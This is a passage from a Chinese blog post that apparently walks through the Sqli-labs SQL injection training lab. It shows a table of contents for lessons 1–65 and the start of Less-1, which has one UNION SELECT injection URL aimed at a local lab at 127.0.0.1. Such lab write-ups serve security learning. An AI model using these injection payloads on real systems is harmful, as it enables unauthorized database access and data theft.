<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="utf-8">
  <link rel="icon" href="">
  <title>Sqli-labs 大完结 | wumingzhilian</title>
  <meta name="author" content="wuming" />
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="format-detection" content="telphone=no, email=no" />
  
    
      <meta name="description" itemprop="description" content="" />
    
    <meta property="og:title" content="Sqli-labs 大完结" />
    
    <meta property="og:url" content="http://wumingzhilian.github.to/2020/10/18/Sqli-labs-%E5%A4%A7%E5%AE%8C%E7%BB%93/" />
    
      <meta name="twitter:card" content="summary" />
      <meta name="twitter:site" content="@wumingzhilian" />
      <meta name="twitter:title" content="Sqli-labs 大完结" />
      
        <meta name="twitter:description" content="" />
      
      
    
  
  <link rel="alternate" href="atom.xml" type="application/atom+xml">
  <!-- 样式表文件 -->
  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
  <link rel="stylesheet" id="highlight-css" href="/css/highlight.min.css" type="text/css" media="all">
  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@1.2.6/dist/disqusjs.css">
  
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
  
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
  
  
    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
  
  <!-- 不得不预先加载的一些JS文件 -->
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
  
    <script async src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
  
  
    <script async src="https://cdn.jsdelivr.net/npm/disqusjs@1.2.6/dist/disqus.js"></script>
  
<meta name="generator" content="Hexo 5.0.0"></head>
<body class="custom-background">
    <div id="kratos-wrapper">
        <div id="kratos-page">
            <div id="kratos-header">
                <div class="nav-toggle"><a class="kratos-nav-toggle js-kratos-nav-toggle"><i></i></a></div>
                <header id="kratos-header-section">
                    <div class="container">
                        <div class="nav-header">
                            <div class="color-logo"><a href="/">wumingzhilian</a></div>
                            <nav id="kratos-menu-wrap">
                              <ul id="kratos-primary-menu" class="sf-menu">
                              
                                
                                  <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
                                
                              
                                
                                  <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
                                
                              
                                
                                  <li><a href="/friends/"><i class="fa fa-mars-double"></i>好伙伴</a></li>
                                
                              
                                
                                  <li><a href="/about/"><li><i class="fa fa-paper-plane"></i>关于我</a></li>
                                
                              
                              </ul>
                            </nav>
                        </div>
                    </div>
                </header>
            </div>

<div class="kratos-start kratos-hero-2">
    <!-- <div class="kratos-overlay"></div> -->
    <div class="kratos-cover kratos-cover-2 text-center">
        <div class="desc desc2 animate-box">
            <a href="/"><h2>wumingzhilian</h2><br><span></span></a>
        </div>
    </div>
</div>

<div id="kratos-blog-post">
    <div class="container">
            <div class="row">
                
<div id="main">
    <section class="col-md-8">
    <article>
        <div class="kratos-hentry kratos-post-inner clearfix">
            <header class="kratos-entry-header">
                <h1 class="kratos-entry-title text-center">Sqli-labs 大完结</h1>
                
                <div class="kratos-post-meta text-center">
                    <span>
                    <i class="fa fa-calendar"></i> 2020-10-18
                    <i class="fa fa-folder"></i> 分类于 <a class="label-link" href="/categories/Sqli-labs/">Sqli-labs</a>
                    <i class="fa fa-user"></i> 作者 wuming
                    </span>
                </div>
            </header>
            <div class="kratos-post-content">
                
                    <div class="kratos-post-inner-toc">
                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#page-1"><span class="toc-number">1.1.</span> <span class="toc-text">page-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1-GET-Error-based-Single-quotes-String-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GET-Error-based-Intiger-based-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.2.</span> <span class="toc-text">GET - Error based - Intiger based (基于错误的GET整型注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.3.</span> <span class="toc-text">Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4-GET-Error-based-Double-Quotes-String-%EF%BC%88%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">1.1.4.</span> <span class="toc-text">Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5-GET-Double-Injection-Single-Quotes-String-%E5%8F%8C%E6%B3%A8%E5%85%A5GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.5.</span> <span class="toc-text">Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">关于时间的盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%98%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8Cxpath%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">还可以进行xpath注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-6-GET-Double-Injection-Double-Quotes-String-%E5%8F%8C%E6%B3%A8%E5%85%A5GET%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.6.</span> <span class="toc-text">Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-7-GET-Dump-into-outfile-String-%EF%BC%88%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6GET%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">1.1.7.</span> <span class="toc-text">Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%80%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.7.1.</span> <span class="toc-text">所用函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-8-GET-Blind-Boolian-Based-Single-Quotes-%E5%B8%83%E5%B0%94%E5%9E%8B%E5%8D%95%E5%BC%95%E5%8F%B7GET%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.8.</span> <span class="toc-text">Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-9-GET-Blind-Time-based-Single-Quotes-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.9.</span> <span class="toc-text">Less-9 GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10-GET-Blind-Time-based-double-quotes-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.10.</span> <span class="toc-text">Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11-POST-Error-Based-Single-quotes-String-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84POST%E5%9E%8B%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.11.</span> <span class="toc-text">Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E5%8F%8C%E5%BC%95%E5%8F%B7POST%E5%9E%8B%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%8F%98%E5%BD%A2%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.12.</span> <span class="toc-text">Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-13-POST-Double-Injection-Single-quotes-String-twist-POST%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E5%8F%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.13.</span> <span class="toc-text">Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.13.1.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.13.2.</span> <span class="toc-text">常规注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-14-POST-Double-Injection-Single-quotes-String-twist-POST%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E5%8F%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.14.</span> <span class="toc-text">Less-14 POST - Double Injection - Single quotes-  String -twist (POST单引号变形双注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-15-POST-Blind-Boolian-time-Based-Single-quotes-%E5%9F%BA%E4%BA%8Ebool%E5%9E%8B-%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E5%8D%95%E5%BC%95%E5%8F%B7POST%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.15.</span> <span class="toc-text">less-15 POST - Blind- Boolian&#x2F;time Based - Single quotes (基于bool型&#x2F;时间延迟单引号POST型盲注)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-16-POST-Blind-Boolian-Time-Based-Double-quotes-%E5%9F%BA%E4%BA%8Ebool%E5%9E%8B-%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E7%9A%84%E5%8F%8C%E5%BC%95%E5%8F%B7POST%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.16.</span> <span class="toc-text">Less-16 POST - Blind- Boolian&#x2F;Time Based - Double quotes (基于bool型&#x2F;时间延迟的双引号POST型盲注)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17-POST-Update-Query-Error-Based-String-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E6%9B%B4%E6%96%B0%E6%9F%A5%E8%AF%A2POST%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.17.</span> <span class="toc-text">Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-18-POST-Header-Injection-Uagent-field-Error-based-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E7%94%A8%E6%88%B7%E4%BB%A3%E7%90%86%EF%BC%8C%E5%A4%B4%E9%83%A8POST%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.18.</span> <span class="toc-text">Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-19-POST-Header-Injection-Referer-field-Error-based-%E5%9F%BA%E4%BA%8E%E5%A4%B4%E9%83%A8%E7%9A%84Referer-POST%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.19.</span> <span class="toc-text">Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-20-POST-Cookie-injections-Uagent-field-Error-based-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84cookie%E5%A4%B4%E9%83%A8POST%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.20.</span> <span class="toc-text">Less-20 POST - Cookie injections - Uagent field  - Error based (基于错误的cookie头部POST注入)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#page-2"><span class="toc-number">1.2.</span> <span class="toc-text">page-2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-21-Cookie-Injection-Error-Based-complex-string"><span class="toc-number">1.2.1.</span> <span class="toc-text">Less-21 Cookie Injection- Error Based- complex - string</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8BCookie%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text">Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-23-GET-Error-based-strip-comments-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%EF%BC%8C%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%9A%84GET%E5%9E%8B"><span class="toc-number">1.2.3.</span> <span class="toc-text">Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-24-Second-Degree-Injections-Real-treat-Store-Injections-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.4.</span> <span class="toc-text">Less - 24 Second Degree Injections  Real treat -Store Injections (二次注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-25-Trick-with-OR-amp-AND-%E8%BF%87%E6%BB%A4%E4%BA%86or%E5%92%8Cand"><span class="toc-number">1.2.5.</span> <span class="toc-text">Less-25 Trick with OR &amp; AND (过滤了or和and)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-25a-Trick-with-OR-amp-AND-Blind-%EF%BC%88%E8%BF%87%E6%BB%A4%E4%BA%86or%E5%92%8Cand%E7%9A%84%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="toc-number">1.2.6.</span> <span class="toc-text">Less-25a Trick with OR &amp; AND Blind （过滤了or和and的盲注）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-26-Trick-with-comments-and-space-%E8%BF%87%E6%BB%A4%E4%BA%86%E6%B3%A8%E9%87%8A%E5%92%8C%E7%A9%BA%E6%A0%BC%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.7.</span> <span class="toc-text">Less-26 Trick with comments and space (过滤了注释和空格的注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC%E5%92%8C%E6%B3%A8%E9%87%8A%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.8.</span> <span class="toc-text">less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-%EF%BC%88%E8%BF%87%E6%BB%A4%E4%BA%86union%E5%92%8Cselect%E7%9A%84%EF%BC%89"><span class="toc-number">1.2.9.</span> <span class="toc-text">less 27 GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us"><span class="toc-number">1.2.10.</span> <span class="toc-text">less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%EF%BC%8C%E6%9C%89%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%8C%E8%BF%87%E6%BB%A4%E4%BA%86union%E5%92%8Cselect%E7%AD%89%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.11.</span> <span class="toc-text">less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis%E5%9F%BA%E4%BA%8E%E7%9B%B2%E6%B3%A8%E7%9A%84%EF%BC%8C%E6%9C%89%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%8C%E8%BF%87%E6%BB%A4%E4%BA%86union%E5%92%8Cselect%E7%AD%89%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.12.</span> <span class="toc-text">less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-29-%E5%9F%BA%E4%BA%8EWAF%E7%9A%84%E4%B8%80%E4%B8%AA%E9%94%99%E8%AF%AF"><span class="toc-number">1.2.13.</span> <span class="toc-text">Less-29 基于WAF的一个错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-30-Get-Blind-Havaing-with-WAF"><span class="toc-number">1.2.14.</span> <span class="toc-text">Less-30 Get-Blind Havaing with WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-31-Protection-with-WAF"><span class="toc-number">1.2.15.</span> <span class="toc-text">Less-31 Protection with WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-32-Bypass-addslashes"><span class="toc-number">1.2.16.</span> <span class="toc-text">Less-32 Bypass addslashes()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-33-Bypass-addslashes"><span class="toc-number">1.2.17.</span> <span class="toc-text">Less-33 Bypass addslashes()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-34-Bypass-Add-SLASHES"><span class="toc-number">1.2.18.</span> <span class="toc-text">Less-34 Bypass Add SLASHES</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-35-why-care-for-addslashes"><span class="toc-number">1.2.19.</span> <span class="toc-text">Less-35 why care for addslashes()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-36-Bypass-MySQL-Real-Escape-String"><span class="toc-number">1.2.20.</span> <span class="toc-text">Less-36 Bypass MySQL Real Escape String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-37-MySQL-real-escape-string"><span class="toc-number">1.2.21.</span> <span class="toc-text">Less-37- MySQL_real_escape_string</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#page-3"><span class="toc-number">1.3.</span> <span class="toc-text">page-3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-38-stacked-Query"><span class="toc-number">1.3.1.</span> <span class="toc-text">Less-38 stacked Query</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-39-stacked-Query-Intiger-type"><span class="toc-number">1.3.2.</span> <span class="toc-text">Less-39 stacked Query Intiger type</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-40-stacked-Query-String-type-Blind"><span class="toc-number">1.3.3.</span> <span class="toc-text">Less-40 stacked Query String type Blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-41-stacked-Query-Intiger-type-blind"><span class="toc-number">1.3.4.</span> <span class="toc-text">Less-41 stacked Query Intiger type blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-42-Stacked-Query-error-based"><span class="toc-number">1.3.5.</span> <span class="toc-text">Less-42 - Stacked Query error based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less43-POST-Error-based-String-Stacked-with-tiwst-POST%E5%9E%8B%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E5%A0%86%E5%8F%A0%E5%8F%98%E5%BD%A2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.6.</span> <span class="toc-text">less43 POST -Error based -String -Stacked with tiwst(POST型基于错误的堆叠变形字符型注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-44-Stacked-Query-blind"><span class="toc-number">1.3.7.</span> <span class="toc-text">Less-44 - Stacked Query blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-45-%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84password%E5%A4%84%E7%9A%84%E2%80%99-%E9%97%AD%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.8.</span> <span class="toc-text">less-45 基于报错的password处的’)闭合注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-46-ORDER-BY-Error-Numeric"><span class="toc-number">1.3.9.</span> <span class="toc-text">less-46 ORDER BY-Error-Numeric</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-47-ORDER-BY-Clause-Error-Single-quote"><span class="toc-number">1.3.10.</span> <span class="toc-text">Less-47 - ORDER BY Clause-Error-Single quote</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-48-ORDER-BY-Clause-Blind-based"><span class="toc-number">1.3.11.</span> <span class="toc-text">Less-48 - ORDER BY Clause Blind based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less49-ORDER-BY-Clause-Blind-based"><span class="toc-number">1.3.12.</span> <span class="toc-text">Less49 - ORDER BY Clause Blind based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less50-ORDER-BY-Clause-Blind-based"><span class="toc-number">1.3.13.</span> <span class="toc-text">Less50 - ORDER BY Clause Blind based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-51-ORDER-BY-Clause-Blind-based"><span class="toc-number">1.3.14.</span> <span class="toc-text">Less-51 - ORDER BY Clause Blind based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-52-ORDER-BY-Clause-Blind-based"><span class="toc-number">1.3.15.</span> <span class="toc-text">Less-52 - ORDER BY Clause Blind based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-53-ORDER-BY-Clause-Blind-based"><span class="toc-number">1.3.16.</span> <span class="toc-text">Less-53 - ORDER BY Clause Blind based</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Page-4"><span class="toc-number">1.4.</span> <span class="toc-text">Page-4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-54-Challenge-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">Less-54:Challenge-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-55-Challenge-2"><span class="toc-number">1.4.2.</span> <span class="toc-text">Less-55:Challenge-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-56-Challenge-3"><span class="toc-number">1.4.3.</span> <span class="toc-text">Less-56:Challenge-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-57-Challenge-4"><span class="toc-number">1.4.4.</span> <span class="toc-text">Less-57:Challenge-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-58-Challenge-5"><span class="toc-number">1.4.5.</span> <span class="toc-text">Less-58:Challenge-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-59-Challenge-6"><span class="toc-number">1.4.6.</span> <span class="toc-text">Less-59:Challenge-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-60-Challenge-7"><span class="toc-number">1.4.7.</span> <span class="toc-text">Less-60:Challenge-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-61-Challenge-8"><span class="toc-number">1.4.8.</span> <span class="toc-text">Less-61:Challenge-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-62-Challenge-9"><span class="toc-number">1.4.9.</span> <span class="toc-text">Less-62:Challenge-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-63-Challenge-10"><span class="toc-number">1.4.10.</span> <span class="toc-text">Less-63:Challenge-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-64-Challenge-11"><span class="toc-number">1.4.11.</span> <span class="toc-text">Less-64:Challenge-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-65-Challenge-12"><span class="toc-number">1.4.12.</span> <span class="toc-text">Less-65:Challenge-12</span></a></li></ol></li></ol></li></ol>
                    </div>
                
                <hr />
                <p>@<a href="sqlilabs%E8%AF%A6%E8%A7%A3%EF%BC%88%E5%AE%8C%E7%BB%93%EF%BC%89">toc</a></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="page-1"><a href="#page-1" class="headerlink" title="page-1"></a>page-1</h2><h3 id="Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)"></a>Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</h3><p><img src="https://img-blog.csdnimg.cn/20200728190929345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020072819093798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
<p>常规注入，order by 4不行，order by 3 可以<br>然后，我们看看回显位置<br>如下是源码</p>
